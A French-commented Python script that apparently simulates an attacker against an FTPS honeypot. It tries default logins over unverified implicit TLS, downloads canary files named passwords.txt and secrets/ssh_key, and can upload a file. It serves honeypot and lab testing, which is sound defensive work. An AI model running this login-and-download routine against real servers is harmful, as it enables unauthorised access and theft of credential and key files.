#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attacker Implicit-FTPS — script complet et robuste

Fonctionnalités :
 - TLS implicite dès la connexion TCP
 - LOGIN anonymous/"" et attacker/secret par défaut
 - NLST "." pour Twisted
 - Téléchargement automatique de passwords.txt et secrets/ssh_key
 - Upload optionnel (--upload)
 - Couleurs (colorama)
 - argparse flexible (host, port, users, pwds, upload, download)
 - Logging console + fichier (dans le vrai home, même sous sudo)
 - Mesure des temps et résumé en fin de run
"""

import os
import sys
import ssl
import socket
import argparse
import logging
import time
import subprocess
from ftplib import FTP, error_perm

# → Colorama (auto-install si nécessaire)
try:
    from colorama import init, Fore, Style
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Style
init(autoreset=True)

# → Argparse avec valeurs par défaut
parser = argparse.ArgumentParser(description="Attacker Implicit-FTPS script")
parser.add_argument("-H", "--host",    default="192.168.100.51",
                    help="IP ou hostname du honeypot")
parser.add_argument("-P", "--port",    default=2121, type=int,
                    help="Port FTPS implicite")
parser.add_argument("-U", "--users",   nargs="+",
                    default=["anonymous", "attacker"],
                    help="Utilisateurs à tester")
parser.add_argument("-W", "--pwds",    nargs="+",
                    default=["", "secret"],
                    help="Passwords correspondants")
parser.add_argument("-d", "--download",
                    default="~/ftp_downloads",
                    help="Dossier local pour les téléchargements")
parser.add_argument("-u", "--upload",
                    help="Chemin local d'un fichier à uploader")
args = parser.parse_args()

# → Détecte le vrai home si on est en sudo
sudo_user = os.environ.get("SUDO_USER")
if sudo_user:
    HOME = os.path.expanduser(f"~{sudo_user}")
else:
    HOME = os.path.expanduser("~")

# → Prépare le dossier de téléchargement (fallback /tmp si besoin)
DOWNLOAD_DIR = os.path.expanduser(args.download.replace("~", HOME))
try:
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
except PermissionError:
    DOWNLOAD_DIR = "/tmp/ftp_downloads"
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    print(Fore.YELLOW + f"[WARN] fallback download → {DOWNLOAD_DIR}")

# → Configure logging console + fichier
logger = logging.getLogger("attacker")
logger.setLevel(logging.INFO)
fmt = logging.Formatter("%(asctime)s %(levelname)s %(message)s")

# console handler
ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(fmt)
logger.addHandler(ch)

# file handler
LOG_PATH = os.path.join(HOME, "attacker.log")
try:
    fh = logging.FileHandler(LOG_PATH)
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    logger.info(f"Logging to {LOG_PATH}")
except PermissionError:
    logger.warning(f"Cannot write log to {LOG_PATH}, skipping file log")

# → Fichiers « canary » à récupérer
CANARY_FILES = ["passwords.txt", "secrets/ssh_key"]

def try_user(user: str, pwd: str):
    t0 = time.time()
    logger.info(Fore.CYAN + f"Testing {user!r}/{pwd!r} on {args.host}:{args.port}")
    try:
        # 1) Connexion TCP + TLS implicite
        raw = socket.create_connection((args.host, args.port), timeout=10)
        ctx = ssl._create_unverified_context()
        ss  = ctx.wrap_socket(raw, server_hostname=args.host)

        # 2) Greffe ftplib.FTP sur la socket TLS
        ftp = FTP()
        ftp.sock          = ss
        ftp.file          = ss.makefile('r', encoding='utf-8', newline='\r\n')
        ftp.af            = ss.family
        ftp.passiveserver = True

        # 3) Bannière
        banner = ftp.getresp().strip()
        logger.info(Fore.YELLOW + banner)

        # 4) LOGIN
        resp = ftp.login(user, pwd)
        logger.info(Fore.GREEN + f"LOGIN OK: {resp}")

        # 5) NLST "."
        files = ftp.nlst(".")
        files = [f.lstrip("./") for f in files]
        logger.info(Fore.MAGENTA + f"FILES: {files}")

        # 6) Téléchargement des canaries
        for cf in CANARY_FILES:
            if cf in files:
                out = os.path.join(DOWNLOAD_DIR, f"{user}_{cf.replace('/', '_')}")
                logger.info(Fore.BLUE + f"↓ DL {cf} → {out}")
                with open(out, "wb") as fd:
                    ftp.retrbinary(f"RETR {cf}", fd.write)
                logger.info(Fore.GREEN + "   ✓ Download succeeded")

        # 7) Upload optionnel
        if args.upload:
            base = os.path.basename(args.upload)
            logger.info(Fore.BLUE + f"↑ UPLOAD {args.upload} → /{base}")
            with open(os.path.expanduser(args.upload), "rb") as rd:
                ftp.storbinary(f"STOR {base}", rd)
            logger.info(Fore.GREEN + "   ✓ Upload succeeded")

        ftp.quit()
        return True, time.time() - t0

    except error_perm as e:
        logger.warning(Fore.RED + f"Permission error for {user}: {e}")
    except Exception as e:
        logger.error(Fore.RED + f"Error for {user}: {e}", exc_info=True)

    return False, time.time() - t0

def main():
    logger.info("[*] START Attacker")
    results = []
    for idx, user in enumerate(args.users):
        pwd = args.pwds[idx] if idx < len(args.pwds) else ""
        ok, dur = try_user(user, pwd)
        results.append((user, ok, dur))

    logger.info("[*] SUMMARY")
    for user, ok, dur in results:
        status = Fore.GREEN + "OK" if ok else Fore.RED + "KO"
        logger.info(f" - {user:10s}: {status} in {dur:.2f}s")

    logger.info(f"Downloads stored in {DOWNLOAD_DIR}")
    logger.info("END Attacker")

if __name__ == "__main__":
    main()
